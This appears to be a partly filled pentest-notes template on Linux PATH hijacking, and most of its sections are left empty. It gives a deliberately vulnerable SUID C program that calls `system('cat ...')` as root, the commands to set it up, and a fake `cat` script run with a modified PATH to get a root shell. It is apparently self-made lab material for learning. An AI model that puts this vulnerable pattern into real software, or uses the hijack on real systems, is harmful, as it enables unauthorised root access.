# [Topic Name]  
Path Hijacking

`⚠️` **Difficulty Level**: Begginer
`📅` **Last Updated**: 2025-08-16  

---

## 📌 Overview  
- Path Hijacking is a technique where an attacker can execute a malicious program by manipulating the PATH environment variable. 

---

## 🔍 Prerequisites  
**Knowledge**:  
- Basic Linux knowledge 

**Tools**:  

---

## 🛠️ Methodology  
### 1. Enumeration  
**Automated**:  
```bash

```  
**Manual Checks**:  
- Files/Permissions:  
  ```bash

  ```  
- Services/Ports:  
  ```bash

  ```  

### 2. Exploitation  
**Technique 1**: [Name]  
- **Description**:  
First we need to create a file that will be executed when the target runs a command. And contains root privileges.

```c
// compile with:
// gcc reader.c -o reader


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VALID_FILES[] = {"01.txt", "02.txt"}; // list of names that the program considers allowed
int valid_files_count = 2; // stores how many valid files are in the list

int main( int argc, char**argv ){
    // validation
    if( argc < 2 ) {
        fprintf(stderr, "Usage: %s <filename>\n", argv[0]); //fprintf is used to print stdout with format
        return -1;
    }

    char *user_filename = argv[1];

    for(int i = 0; i < valid_files_count; i++){
        char *valid_filename = VALID_FILES[i];
        int length = strlen(valid_filename);

        if(!strncmp(user_filename, valid_filename, length)){
            char cmd[42] = {0};
            sprintf(cmd, "cat ./archive/%s", user_filename);
            setuid(0);
            setgid(0);
            system(cmd);
            return 0;
        }
    }
    printf("[INFO]: NO file with such names were found.\n");
    return 0;
}

```
Then, we need to compile the script, asign owners and set SUID perms.

```bash
gcc reader.c -o reader && sudo chown root reader && sudo chmod +s reader
```

After that, we need to create a cat file that runs a bash and sert execution permissions.

```bash
echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat && chmod +x cat
```
Once do this, we need to run de compiled file using the path hijacking technique. ANd we will get a bash like root.

```bash
PATH=.:$PATH ./reader 01.txt
```

## ⚠️ Common Vulnerabilities  


---

## 🧰 Tools Cheatsheet  


---

## 🎯 Practice Labs  


---

## 📚 References  


---

## 🚀 Quick Commands  
```bash

```